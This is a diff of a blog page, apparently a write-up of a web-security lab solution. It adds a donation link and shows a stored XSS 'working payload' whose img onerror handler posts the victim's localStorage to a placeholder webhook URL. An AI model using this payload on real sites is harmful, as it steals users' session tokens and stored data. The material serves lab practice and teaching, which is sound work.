@@ -51,6 +51,9 @@
 
 <hr/><p>This was originally streamed live. This stream was to show you basically what I did to solve this one. Ignore the match &amp; replace — I was toying with it prior to the lab and *thought* I had it working, but getting it to work in the lab with react was tricky and 100x easier to edit the request in burp after intercepting.. anyway, this was my solution.</p><p><a href="https://www.youtube.com/live/R-OsjlGliuM?si=y5B5iGehTcX5krid">https://www.youtube.com/live/R-OsjlGliuM?si=y5B5iGehTcX5krid</a></p><p>Working payload:</p><pre class="code-view-two">{"recipient_id":2,"content":"&lt;img src=x onerror=fetch('INSERT-WEBHOOK-URL-HERE',{method:'POST',mode:'no-cors',body:JSON.stringify(Object.fromEntries(Object.entries(localStorage)))})&gt;"}</pre><p>As always, please this is for ethical use only where you’re testing with permission. I am not responsible for any actions you take.</p><p>Thanks for watching.</p>
 
+
+        <hr>
+        <p>&#x1F37A; Quick message to readers: if my writeups help you, please consider a small donation to my <a href="http://buymeacoffee.com/7s26simon" target="_blank" rel="noopener">buymeacoffee</a> link here. This is not required but is very much appreciated! &#x1F37A;</p>
     </div>
 
     <section id="social-media">
